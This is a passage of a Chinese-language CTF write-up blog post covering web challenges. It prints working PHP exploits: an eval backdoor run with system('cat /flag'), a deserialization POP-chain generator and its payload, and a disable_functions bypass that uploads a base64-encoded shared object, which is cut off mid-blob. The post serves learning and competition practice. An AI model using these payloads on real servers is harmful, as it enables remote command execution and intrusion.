    <content type="html"><![CDATA[<blockquote><p>这次顶着桐老爷的id(kirito zbds, 本来只是想着做做Web和尝试做完Crypto的(结果没有做完,有趣的加密<del>是真的有趣</del>, 结果发现不做Misc分不太够, 就肝了几道, 还是学到了不少东西的.</p></blockquote><p>所以先来个目录吧(pwn真的是一道都不会嗯…:</p><p>Web</p><ul><li><a href='#1'>假的签到</a></li><li><a href='#2'>世界上最简单的后门</a></li><li><a href='#3'>Let’s play a simple game again</a></li><li><a href='#4'>lottery_revenge</a></li><li><a href='#5'>unserialize</a></li><li><a href='#6'>又一个后门</a></li><li><a href='#7'>babysql</a></li><li><a href='#8'>babyssrf</a></li></ul><p>OSINT</p><ul><li><a href='#9'>checkin</a></li></ul><p>REVERSE</p><ul><li><a href='#10'>捉迷藏</a></li><li><a href='#11'>basic_hash</a></li><li><a href='#12'>ByteCode</a></li></ul><p>Misc</p><ul><li><a href='#13'>真·签到</a></li><li><a href='#14'>Look_at_your_keyboard</a></li><li><a href='#15'>Buddha</a></li><li><a href='#16'>Do you know Xp0int</a></li><li><a href='#17'>close_base</a></li><li><a href='#18'>PMGBA</a></li><li><a href='#19'>集齐五龙珠</a></li></ul><p>Cyrpto</p><ul><li><a href='#20'>碰碰车</a></li><li><a href='#21'>EasyRSA</a></li><li><a href='#22'>Go Home</a></li><li><a href='#23'>block cipher</a></li><li><a href='#24'>ant forest</a><br><a name='1'></a></li></ul><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="假的签到"><a href="#假的签到" class="headerlink" title="假的签到"></a>假的签到</h2><p>robots! robots! robots! robots协议<br>这个协议里面是用来设定一些网站里不能被搜索引擎获取的内容的(不过CTF里就变成提示做题人方向的一个文件了?<br>一般拿到web说不定robots.txt里面就有提示呢<del>不过大概率是没有的</del></p><p>所以马上进/robots.txt看看, 里面有个提示:/phpp_tql.php<br>访问/phpp_tql.php有一段源码<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-c3a1121734864c0d88c7d4bbb4e511db.png" alt="图片.png"><br>看了下是关于md5的比较的,因为是===, 肯定不会是弱类型了, 想起之前就挖过一个坑<a href="http://47.98.130.190:8090/archives/web-md5sha%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83">某篇MD5的总结</a>, 所以很快就想到用数组来做了.</p><p><strong>当a和b都是数组的时候, md5(a) === md5(b) 会判断为真.</strong><br>利用这个就可以构造payload: <code>?phpp[]=1&amp;hphh[]=2</code><br><a name='2'></a></p><h2 id="世界上最简单的后门"><a href="#世界上最简单的后门" class="headerlink" title="世界上最简单的后门"></a>世界上最简单的后门</h2><p><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-7523c61da6594c3daaef38a5131d36b4.png" alt="图片.png"><br>啊这, eval()真的很安全的.<br>关于直接把用户的输入直接放在eval()中导致目录都被翻了个遍这档事(<br>也没想太多, 手动翻了一下目录(dalao都是直接搜索flag的<br>往上翻一个目录<code>system(&#39;ls /&#39;);</code>就发现有flag了<br>于是掏出hackbar(POST) <code>c=system(&#39;cat /flag&#39;);</code><br><a name='3'></a></p><h2 id="Let’s-play-a-simple-game-again"><a href="#Let’s-play-a-simple-game-again" class="headerlink" title="Let’s play a simple game again"></a>Let’s play a simple game again</h2><p>开头根据要求GET和POST传参就行了.<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-bbf65015412b431eab2aa9e23f8723cd.png" alt="图片.png"><br>但是这里好像出了一个小问题. 做题的时候都是想着怎么做快就怎么做. 于是给主办方提交wp的时候似乎遗漏了什么(不要打我我真的是后来才发现的…</p><p>不是admin就进不去吗! 其实第一想法应该就是X-Forwarded-For改127.0.0.1的, 然而我直接去看Cookies了, 也没有改XFF(X-Forwarded-For</p><p>发现<code>Cookies: YWRtaW49MA==</code>, 两个等号十有八九是base64了, 扔去base64解码出来的是<code>admin=0</code>, 想着让Cookies为<code>admin=1</code>应该没问题了. 所以将Cookies改成<code>YWRtaW49MQ==</code>, 就拿到<code>Welcome admin! Here is your flag:ctf&#123;Have_4_n1ce_c0mpetition!&#125;</code>了.</p><p>然而…事情并没有这么简单, 昨天某御坂大佬发了自己的wp之后我发现, 什么???X-Forwarded-For要改127.0.0.1???, 我没改怎么拿到flag了???<br>于是看了看自己的firefox插件…<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-6b3d3e511cf849dbb10063a1442afc3c.png" alt="图片.png"><br>屮…原来是之前做了题就没有关掉这个, 导致自己一直都是127.0.0.1…<br>所以直接就出flag了…<br>但是wp已经提交了啊! 也没办法改了, 说实话有点慌…<br><a name='4'></a></p><h2 id="lottery-revenge"><a href="#lottery-revenge" class="headerlink" title="lottery_revenge"></a>lottery_revenge</h2><p>去年也有抽奖, 一样的页面, 不一样的味道…(伪随机数的攻击居然在web里面出现了…</p><p>因为去年做过, 所以上来直接就开抽了(burpsuite永远的神, 但是发现不断访问data.php都是同一个响应, 有点不太对劲.<br>所以看了看响应发现了一段注释</p><p><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-fc6b045f35f149dd8b50dc4528d28ff7.png" alt="图片.png"></p><p>啊…抽奖它, 它升级了.<br>要求<code>$_POST[&#39;admin_key&#39;]==$_SESSION[&#39;key&#39;]</code> </p><p>session就是时间戳吧. 第一个想法是先取现在的时间戳加上一个常数然后不停访问. 但是怎样都访问不成功(事实上就算访问成功了也就抽了一次奖, 下一次还得重新构造新的时间戳…</p><p>其实这里卡了一段时间(我也不知道自己到底爆破了多久…, 发现怎样都不行后就去看了下$_SESSION变量有没有什么可以利用的特性或者漏洞. 还真就发现了一个特性:<strong>当用户第一次访问的时候,$_SESSION的所有变量都是为空的(就是说初始化为空嘛</strong>, 可以看一下源码, 给<code>$_SESSION[&#39;key&#39;]</code>赋值是在一次访问之后, 所以!</p><p>只需要不带Cookies以及带上空的admin_key访问data.php就可以开始抽奖啦.<br>抽出结果还是很开心的, 但是结果还需要下一步…<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-f657ee08e09a4a97a063d9fd76f10eb5.png" alt="图片.png"></p><p>离谱, 按着提示进去<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-424af361456148ddaa656b953ec9c0e7.png" alt="图片.png"></p><p>一开始没懂这个页面要我干嘛, 看看注释有没有提示, 发现下面有个source=1<br>dddd, ?source=1看源码</p><p><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-2ec42f08584f42debb5b0bcbc585174d.png" alt="图片.png"></p><p>大概是说随机生成30个数, 对应一个表中的30个字母生成一个随机的字符串, 给出前11位猜整个字符串.</p><p>毕竟做了挺多伪随机数的题了, 看到<code>mt_rand()</code>就想起之前差点没把我整吐的MT-19937.(当种子设定每次随机出来的数都是一模一样是不是很神奇啊! N1CTF那道伪随机数还历历在目.</p><p>所以说, 理论上知道随机数前面的几位输出是可以逆推回种子的(有时候需要足够多的输出才能得到种子, 但具体逆的算法肯定不是这题的考点(<del>考了我也逆不出来, python脚本倒是有一个…</del></p><p>所以去搜了一下有没有攻击<code>mt_rand()</code>的脚本. 真就有一个php_mt_seed, github上就有了. 但是做的时候这里踩了一个大坑, github上面的是低版本的脚本, 所以导致跑了一下午都没有跑出结果来. </p><p>直到晚上发现别人的blog用的明显不是一个版本的脚本! 才去找了找发现真有从未体验过的船新版本, 马上扔进虚拟机跑, 不到一分钟就出结果了.<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-d72e71e29d1a403991af5990f5eccc43.png" alt="图片.png"></p><p>拿着刚出来的种子生成字符串提交就行了<br><a name='5'></a></p><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><p>一直觉得反序列化真的很有意思, 就像推理一样一步一步的往下推出payload<br>源码在这</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getit</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;cache[<span class="variable">$key</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cache[<span class="variable">$key</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getit(<span class="variable">$method</span>), <span class="variable">$args</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evil</span>,<span class="variable">$arggg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evallll</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;evil,<span class="keyword">$this</span>-&gt;arggg);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;sssssss&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>首先call_user_func()可以执行php中的函数, 包括<code>system(), assert()</code>这些危险的函数</p><p>而源码里面只有在类C中的call_user_func()是可以自己给定执行的函数和所用的参数的, 变量<code>$evil</code>和函数<code>evallll()</code>也提示了危险函数就出现在类C中, 所以现在的目的就是想办法调用类C中的<code>evallll()</code></p><p>反序列化的题基本离不开魔法函数, 找了一下, 这里的出现了<code>__destruct()</code>和<code>__call($method, $args)</code>.</p><p>对于<code>__destruct()</code>, 当某个对象被销毁的时候如果存在这个方法就会调用它. 程序结束肯定会销毁呀.</p><p>而对于<code>__call()</code>:<br><strong>当某个对象的一个不存在的方法被调用时, 如果__call方法存在, 则会调用__call方法, 第一个参数是所调用的那个不存在的方法名, 第二个参数是调用不存在的方法时的参数.</strong></p><p>因为A中的<code>__destruct()</code>会调用<code>$data-&gt;close()</code>, 所以能靠这个从A进入B的<code>__call</code>. </p><p>再看看B中的<code>call_user_func_array($this-&gt;getit($method), $args);</code><br>其实就是<code>call_user_func_array($this-&gt;cache[$key], $args);</code></p><p>做到这里我就卡住了, 因为<code>$args</code>并不可控, 所以一时半会想不到怎样通过B中的这个函数去进入C. 于是决定去看看<code>call_user_func_array();</code>的手册.</p><p>这才知道原来这个函数的第一个参数可以是一个数组,具体是这样:<code>[对象,对象的方法]</code>, 这样就可以调用C中的<code>evallll()</code>了!</p><p>所以只需要有:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class C中:</span><br><span class="line"><span class="variable">$evil</span> = <span class="string">&#x27;system()&#x27;</span>;</span><br><span class="line"><span class="variable">$arggg</span> = cmd; <span class="comment"># 具体就是需要执行的指令</span></span><br><span class="line"></span><br><span class="line">class B中:</span><br><span class="line"><span class="variable">$cache</span>[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> C,<span class="string">&#x27;evallll&#x27;</span>]</span><br><span class="line"></span><br><span class="line">class A中:</span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">new</span> B</span><br></pre></td></tr></table></figure><p>这样就可以任意执行命令了. 至于构造payload, 利用php就能构造了.<br>附上构造的代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = <span class="variable">$ob</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params"><span class="variable">$ob2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = <span class="variable">$ob2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getit</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;cache[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cache[<span class="variable">$key</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getit(<span class="variable">$method</span>), <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evil</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arggg</span> = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evallll</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;evil, <span class="keyword">$this</span>-&gt;arggg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$b</span>-&gt;make([<span class="string">&#x27;close&#x27;</span> =&gt; [<span class="keyword">new</span> C, <span class="string">&#x27;evallll&#x27;</span>]]);</span><br><span class="line"><span class="variable">$a</span>-&gt;make(<span class="variable">$b</span>);</span><br><span class="line">var_dump(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>得到的payload为: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sssssss&#x3D;O:1:&quot;A&quot;:1:&#123;s:4:&quot;data&quot;;O:1:&quot;B&quot;:1:&#123;s:5:&quot;cache&quot;;a:1:&#123;s:5:&quot;close&quot;;a:2:&#123;i:0;O:1:&quot;C&quot;:2:&#123;s:4:&quot;evil&quot;;s:6:&quot;system&quot;;s:5:&quot;arggg&quot;;s:9:&quot;cat &#x2F;flag&quot;;&#125;i:1;s:7:&quot;evallll&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><a name='6'></a></p><h2 id="又一个后门"><a href="#又一个后门" class="headerlink" title="又一个后门"></a>又一个后门</h2><p>这题做的时候发生了件小趣事(<del>当然不是指前二血的大佬在/tmp下面搞事情啦.也不是指上一个大佬做完了题连so文件都没有删啦.更不是指自己做完了还忘记把flag文件给清理掉.</del></p><p>看了下phpinfo(), 发现能执行命令的函数都被ban掉了.</p><p>利用scandir()函数搜索网站目录.发现有tmp文件夹, 尝试上传文件发现可行.</p><p>想了想是否存在绕过disable_functions的漏洞呢?翻了翻百度, 找到一个在Github上的利用LD_PRELOAD漏洞绕过disable_functions的项目.<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">附上链接</a></p><p>具体原理<strong>是利用LD_PRELOAD的特点,它可以影响程序的运行时的链接，它允许在程序运行前优先加载用户定义的动态链接库, 这样就可以覆盖正常的函数库, 调用一些被ban的函数.</strong>(有理解的不对的大佬请务必告诉我!!!</p><p>所以根据github上面的README.MD一步一步的做就行了</p><h3 id="1-先上传一个bypass-disablefunc-x64-so"><a href="#1-先上传一个bypass-disablefunc-x64-so" class="headerlink" title="1. 先上传一个bypass_disablefunc_x64.so"></a>1. 先上传一个bypass_disablefunc_x64.so</h3><p>由于so文件是二进制文件, 所以上传的时候考虑先base64编码, 传上去用php自带的函数解码,下面是当时做题的payload(可能会有点长hhh</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(<span class="string">&#x27;/var/tmp&#x27;</span>));<span class="variable">$a</span>=<span class="string">&#x27;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